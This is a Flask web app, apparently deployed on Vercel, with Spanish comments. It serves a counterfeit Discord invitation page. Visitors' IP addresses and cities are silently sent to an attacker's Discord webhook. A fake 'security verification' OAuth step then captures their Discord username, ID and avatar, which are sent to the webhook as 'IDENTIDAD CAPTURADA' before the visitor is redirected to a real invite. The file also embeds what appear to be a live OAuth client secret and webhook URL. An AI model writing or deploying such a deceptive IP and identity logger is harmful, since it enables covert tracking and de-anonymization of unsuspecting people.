import os
from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# --- CONFIGURACIÓN ---
CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://hgalex.vercel.app/callback"
# El WEBHOOK donde llegarán los logs
WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

# DISEÑO HTML PREMIUM INTEGRADO
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Invitación</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #313338; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Outfit', sans-serif; background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); background-size: cover; color: white; }
        .card { background-color: #2b2d31; width: 100%; max-width: 440px; padding: 32px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .guild-img { width: 80px; height: 80px; border-radius: 28px; margin-bottom: 20px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .header { color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
        .name { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 25px; }
        .btn { background-color: #5865f2; color: white; text-decoration: none; padding: 13px; border-radius: 3px; font-weight: 500; font-size: 16px; display: block; transition: 0.2s; }
        .btn:hover { background-color: #4752c4; }
        .footer { color: #949ba4; font-size: 12px; margin-top: 20px; line-height: 1.5; }
        .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #4e5058; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="{{ logo }}" class="guild-img">
        <div class="header">Estás invitado a unirte a</div>
        <div class="name">Servidor de al3xg0nzalezzz</div>
        <a href="{{ auth_url }}" class="btn">Aceptar Invitación</a>
        <div class="footer">Al unirte, autorizas la verificación de seguridad necesaria para el acceso exclusivo al servidor.</div>
        <div class="brand">al3xg0nzalezzz</div>
    </div>
</body>
</html>
"""

def get_ip():
    # Intenta obtener la IP real detrás de los proxies de Vercel
    ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    return ip

@app.route('/')
def home():
    ip = get_ip()
    city = request.headers.get('x-vercel-ip-city', 'Desconocida')

    # LOG VISITA (IP inicial)
    try:
        requests.post(WEBHOOK, json={
            "username": "1* Tracker - Visita", "avatar_url": LOGO,
            "embeds": [{"title": "👁️ Visita Detectada", "color": 0x5865F2, "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Localidad", "value": f"{city}", "inline": True}]}]
        })
    except Exception as e:
        print(f"Error enviando webhook: {e}")

    # Generar URL de autorización de Discord
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    
    return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    
    # Si no hay código (acceso directo a /callback), redirigir
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
    
    try:
        # Intercambiar código por token
        r = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID, 
            'client_secret': CLIENT_SECRET, 
            'grant_type': 'authorization_code', 
            'code': code, 
            'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
        
        token = r.get('access_token')
        
        if token:
            # Obtener datos del usuario
            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
            ip = get_ip()
            
            # LOG IDENTIDAD (Usuario verificado + IP)
            requests.post(WEBHOOK, json={
                "username": "1* Tracker - IDENTIDAD", "avatar_url": LOGO,
                "embeds": [{
                    "title": "🎯 ¡IDENTIDAD CAPTURADA!", "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else LOGO},
                    "fields": [{"name": "👤 Usuario", "value": f"**{user['username']}**", "inline": True}, {"name": "🆔 ID", "value": f"`{user['id']}`", "inline": True}, {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}]
                }]
            })
    except Exception as e:
        # En caso de error, simplemente redirigir
        print(f"Error en callback: {e}")
        pass
        
    # Redirigir al servidor final de Discord
    return redirect("https://discord.gg/nUy6Vjr9YU")

# Vercel necesita esto
app = app